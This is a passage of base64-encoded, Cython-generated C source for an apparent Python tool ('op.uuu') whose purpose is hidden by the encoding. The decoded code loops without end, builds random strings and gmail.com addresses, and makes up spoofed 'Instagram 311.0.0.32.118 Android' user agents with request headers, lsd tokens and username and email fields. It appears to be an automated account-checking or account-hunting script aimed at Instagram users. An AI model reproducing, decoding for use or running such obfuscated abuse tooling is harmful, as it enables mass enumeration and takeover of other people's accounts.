uZXhwciIsIDApO1xuICBfX3B5eF9jdXJfc2NvcGUgPSAoc3RydWN0IF9fcHl4X29ial8yb3BfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwciAqKV9fcHl4X3RwX25ld18yb3BfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9wdHlwZV8yb3BfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwciwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdHVwbGUsIE5VTEwpO1xuICBpZiAodW5saWtlbHkoIV9fcHl4X2N1cl9zY29wZSkpIHtcbiAgICBfX3B5eF9jdXJfc2NvcGUgPSAoKHN0cnVjdCBfX3B5eF9vYmpfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIgKilQeV9Ob25lKTtcbiAgICBfX1B5eF9JTkNSRUYoUHlfTm9uZSk7XG4gICAgX19QWVhfRVJSKDAsIDQwNiwgX19weXhfTDFfZXJyb3IpXG4gIH0gZWxzZSB7XG4gICAgX19QeXhfR09UUkVGKChQeU9iamVjdCAqKV9fcHl4X2N1cl9zY29wZSk7XG4gIH1cbiAge1xuICAgIF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuID0gX19QeXhfR2VuZXJhdG9yX05ldygoX19weXhfY29yb3V0aW5lX2JvZHlfdCkgX19weXhfZ2JfMm9wXzN1dXVfMmdlbmVyYXRvcjMsICgoUHlPYmplY3QgKilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlszXSksIChQeU9iamVjdCAqKSBfX3B5eF9jdXJfc2NvcGUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZW5leHByLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdXV1X2xvY2Fsc19nZW5leHByLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfb3ApOyBpZiAodW5saWtlbHkoIWdlbikpIF9fUFlYX0VSUigwLCA0MDYsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF9jdXJfc2NvcGUpO1xuICAgIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICAgIHJldHVybiAoUHlPYmplY3QgKikgZ2VuO1xuICB9XG5cbiAgXG4gIF9fcHl4X0wxX2Vycm9yOjtcbiAgX19QeXhfQWRkVHJhY2ViYWNrKCJvcC51dXUuZ2VuZXhwciIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpO1xuICBfX3B5eF9yID0gTlVMTDtcbiAgX19QeXhfREVDUkVGKChQeU9iamVjdCAqKV9fcHl4X2N1cl9zY29wZSk7XG4gIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3IpO1xuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIF9fcHl4X3I7XG59XG5cbnN0YXRpYyBQeU9iamVjdCAqX19weXhfZ2JfMm9wXzN1dXVfMmdlbmVyYXRvcjMoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpfX3B5eF9nZW5lcmF0b3IsIENZVEhPTl9VTlVTRUQgUHlUaHJlYWRTdGF0ZSAqX19weXhfdHN0YXRlLCBQeU9iamVjdCAqX19weXhfc2VudF92YWx1ZSkgXG57XG4gIHN0cnVjdCBfX3B5eF9vYmpfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIgKl9fcHl4X2N1cl9zY29wZSA9ICgoc3RydWN0IF9fcHl4X29ial8yb3BfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwciAqKV9fcHl4X2dlbmVyYXRvci0+Y2xvc3VyZSk7XG4gIFB5T2JqZWN0ICpfX3B5eF9yID0gTlVMTDtcbiAgbG9uZyBfX3B5eF90XzE7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzIgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8zID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfNCA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzUgPSBOVUxMO1xuICBzaXplX3QgX19weXhfdF82O1xuICBpbnQgX19weXhfbGluZW5vID0gMDtcbiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMO1xuICBpbnQgX19weXhfY2xpbmVubyA9IDA7XG4gIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zXG4gIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJnZW5leHByIiwgMCk7XG4gIHN3aXRjaCAoX19weXhfZ2VuZXJhdG9yLT5yZXN1bWVfbGFiZWwpIHtcbiAgICBjYXNlIDA6IGdvdG8gX19weXhfTDNfZmlyc3RfcnVuO1xuICAgIGRlZmF1bHQ6IFxuICAgIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICAgIHJldHVybiBOVUxMO1xuICB9XG4gIF9fcHl4X0wzX2ZpcnN0X3J1bjo7XG4gIGlmICh1bmxpa2VseSghX19weXhfc2VudF92YWx1ZSkpIF9fUFlYX0VSUigwLCA0MDYsIF9fcHl4X0wxX2Vycm9yKVxuICBfX3B5eF9yID0gUHlMaXN0X05ldygwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9yKSkgX19QWVhfRVJSKDAsIDQwNiwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF9yKTtcblxuICBcbiAgZm9yIChfX3B5eF90XzEgPSAwOyBfX3B5eF90XzEgPCAzMjsgX19weXhfdF8xKz0xKSB7XG4gICAgX19weXhfY3VyX3Njb3BlLT5fX3B5eF92X18gPSBfX3B5eF90XzE7XG5cbiAgICBcbiAgICBfX3B5eF90XzMgPSBOVUxMO1xuICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmFuZG9tKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNDA2LCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2Nob2ljZSk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDQwNiwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgX19weXhfdF82ID0gMTtcbiAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTXG4gICAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfNSkpKSB7XG4gICAgICBfX3B5eF90XzMgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzUpO1xuICAgICAgYXNzZXJ0KF9fcHl4X3RfMyk7XG4gICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfNSk7XG4gICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8zKTtcbiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzUsIF9fcHl4X19mdW5jdGlvbik7XG4gICAgICBfX3B5eF90XzYgPSAwO1xuICAgIH1cbiAgICAjZW5kaWZcbiAgICB7XG4gICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYXplcnR5dWlvcG1sa2poZ2Zkc3F3eGN2Ym5BWkVSVFl9O1xuICAgICAgX19weXhfdF8yID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF81LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgyLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCA0MDYsIF9fcHl4X0wxX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gICAgfVxuICAgIGlmICh1bmxpa2VseShfX1B5eF9MaXN0Q29tcF9BcHBlbmQoX19weXhfciwgKFB5T2JqZWN0KilfX3B5eF90XzIpKSkgX19QWVhfRVJSKDAsIDQwNiwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gIH1cbiAgQ1lUSE9OX01BWUJFX1VOVVNFRF9WQVIoX19weXhfY3VyX3Njb3BlKTtcblxuICBcbiAgZ290byBfX3B5eF9MMDtcbiAgX19weXhfTDFfZXJyb3I6O1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3IpOyBfX3B5eF9yID0gMDtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpO1xuICBpZiAoX19QeXhfUHlFcnJfT2NjdXJyZWQoKSkge1xuICAgIF9fUHl4X0dlbmVyYXRvcl9SZXBsYWNlX1N0b3BJdGVyYXRpb24oMCk7XG4gICAgX19QeXhfQWRkVHJhY2ViYWNrKCJnZW5leHByIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gIH1cbiAgX19weXhfTDA6O1xuICBfX1B5eF9YR0lWRVJFRihfX3B5eF9yKTtcbiAgI2lmICFDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLXG4gIF9fUHl4X0Nvcm91dGluZV9SZXNldEFuZENsZWFyRXhjZXB0aW9uKF9fcHl4X2dlbmVyYXRvcik7XG4gICNlbmRpZlxuICBfX3B5eF9nZW5lcmF0b3ItPnJlc3VtZV9sYWJlbCA9IC0xO1xuICBfX1B5eF9Db3JvdXRpbmVfY2xlYXIoKFB5T2JqZWN0KilfX3B5eF9nZW5lcmF0b3IpO1xuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIF9fcHl4X3I7XG59XG5cblxuXG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJvcF8xOHV1dShDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF9zZWxmKSB7XG4gIFB5T2JqZWN0ICpfX3B5eF92X2RvbWFpbiA9IE5VTEw7XG4gIGxvbmcgX19weXhfdl9iYms7XG4gIGxvbmcgX19weXhfdl9JZG87XG4gIFB5T2JqZWN0ICpfX3B5eF92X3JuZCA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X3VzZXJfYWdlbnQgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl9JZCA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X2xzZCA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X2hlYWRlcnMgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl9kYXRhID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfcmVzcG9uc2UgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl91c2VybmFtZSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X3JyID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfZm93cyA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X2VtYWlsID0gTlVMTDtcbiAgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfdl9lID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X2diXzJvcF8zdXV1XzJnZW5lcmF0b3IzID0gMDtcbiAgUHlPYmplY3QgKl9fcHl4X3IgPSBOVUxMO1xuICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9uc1xuICBQeU9iamVjdCAqX19weXhfdF8xID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMiA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzMgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF80ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfNSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzYgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF83ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfOCA9IE5VTEw7XG4gIHNpemVfdCBfX3B5eF90Xzk7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzEwID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMTEgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8xMiA9IE5VTEw7XG4gIGludCBfX3B5eF90XzEzO1xuICBpbnQgX19weXhfdF8xNDtcbiAgaW50IF9fcHl4X2xpbmVubyA9IDA7XG4gIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDtcbiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwO1xuICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgidXV1IiwgMCk7XG5cbiAgXG4gIHdoaWxlICgxKSB7XG5cbiAgICBcbiAgICB7XG4gICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmVcbiAgICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduXG4gICAgICBfX1B5eF9FeGNlcHRpb25TYXZlKCZfX3B5eF90XzEsICZfX3B5eF90XzIsICZfX3B5eF90XzMpO1xuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzEpO1xuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzIpO1xuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzMpO1xuICAgICAgIHtcblxuICAgICAgICBcbiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfZ21haWxfY29tKTtcbiAgICAgICAgX19QeXhfWERFQ1JFRl9TRVQoX19weXhfdl9kb21haW4sIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfZ21haWxfY29tKTtcblxuICAgICAgICBcbiAgICAgICAgX19weXhfdl9iYmsgPSAweDEwQUNDQzgwO1xuXG4gICAgICAgIFxuICAgICAgICBfX3B5eF92X0lkbyA9IDB4MzVCNDA0MzA7XG5cbiAgICAgICAgXG4gICAgICAgIHdoaWxlICgxKSB7XG5cbiAgICAgICAgICBcbiAgICAgICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JhbmRvbSk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDQwMiwgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yYW5kaW50KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgNDAyLCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTddLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNDAyLCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9Vbmljb2RlKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDQwMiwgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICAgICAgX19QeXhfWERFQ1JFRl9TRVQoX19weXhfdl9ybmQsICgoUHlPYmplY3QqKV9fcHl4X3RfNSkpO1xuICAgICAgICAgIF9fcHl4X3RfNSA9IDA7XG5cbiAgICAgICAgICBcbiAgICAgICAgICBfX3B5eF90XzUgPSBQeUxpc3RfTmV3KDYpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA0MDMsIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzIzXzZfMCk7XG4gICAgICAgICAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzIzXzZfMCk7XG4gICAgICAgICAgaWYgKF9fUHl4X1B5TGlzdF9TRVRfSVRFTShfX3B5eF90XzUsIDAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMjNfNl8wKSAhPSAoMCkpIF9fUFlYX0VSUigwLCA0MDMsIF9fcHl4X0w1X2Vycm9yKTtcbiAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8yNF83XzApO1xuICAgICAgICAgIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8yNF83XzApO1xuICAgICAgICAgIGlmIChfX1B5eF9QeUxpc3RfU0VUX0lURU0oX19weXhfdF81LCAxLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzI0XzdfMCkgIT0gKDApKSBfX1BZWF9FUlIoMCwgNDAzLCBfX3B5eF9MNV9lcnJvcik7XG4gICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMjVfN18xXzEpO1xuICAgICAgICAgIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8yNV83XzFfMSk7XG4gICAgICAgICAgaWYgKF9fUHl4X1B5TGlzdF9TRVRfSVRFTShfX3B5eF90XzUsIDIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMjVfN18xXzEpICE9ICgwKSkgX19QWVhfRVJSKDAsIDQwMywgX19weXhfTDVfZXJyb3IpO1xuICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzI2XzhfMCk7XG4gICAgICAgICAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzI2XzhfMCk7XG4gICAgICAgICAgaWYgKF9fUHl4X1B5TGlzdF9TRVRfSVRFTShfX3B5eF90XzUsIDMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMjZfOF8wKSAhPSAoMCkpIF9fUFlYX0VSUigwLCA0MDMsIF9fcHl4X0w1X2Vycm9yKTtcbiAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8yN184XzEpO1xuICAgICAgICAgIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8yN184XzEpO1xuICAgICAgICAgIGlmIChfX1B5eF9QeUxpc3RfU0VUX0lURU0oX19weXhfdF81LCA0LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzI3XzhfMSkgIT0gKDApKSBfX1BZWF9FUlIoMCwgNDAzLCBfX3B5eF9MNV9lcnJvcik7XG4gICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMjhfOV8wKTtcbiAgICAgICAgICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMjhfOV8wKTtcbiAgICAgICAgICBpZiAoX19QeXhfUHlMaXN0X1NFVF9JVEVNKF9fcHl4X3RfNSwgNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8yOF85XzApICE9ICgwKSkgX19QWVhfRVJSKDAsIDQwMywgX19weXhfTDVfZXJyb3IpO1xuICAgICAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmFuZG9tKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNDAzLCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgICAgICAgICBfX3B5eF90XzYgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JhbmRpbnQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCA0MDMsIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxOF0sIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA0MDMsIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5T2JqZWN0X0dldEl0ZW0oX19weXhfdF81LCBfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCA0MDMsIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgICAgIF9fcHl4X3RfNCA9IFB5TnVtYmVyX0FkZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X0luc3RhZ3JhbV8zMTFfMF8wXzMyXzExOF9BbmRyb2lkLCBfX3B5eF90XzYpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA0MDMsIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgICAgIF9fcHl4X3RfNiA9IFB5TnVtYmVyX0FkZChfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzExKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgNDAzLCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICAgICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JhbmRvbSk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDQwMywgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yYW5kaW50KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgNDAzLCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTldLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNDAzLCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9Vbmljb2RlKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDQwMywgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICAgICAgX19weXhfdF80ID0gUHlOdW1iZXJfQWRkKF9fcHl4X3RfNiwgX19weXhfdF81KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNDAzLCBfX3B5eF9MNV9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgICAgICBfX3B5eF90XzUgPSBQeU51bWJlcl9BZGQoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2RwaSk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDQwMywgX19weXhfTDVfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yYW5kb20pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA0MDMsIF9fcHl4X0w1X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3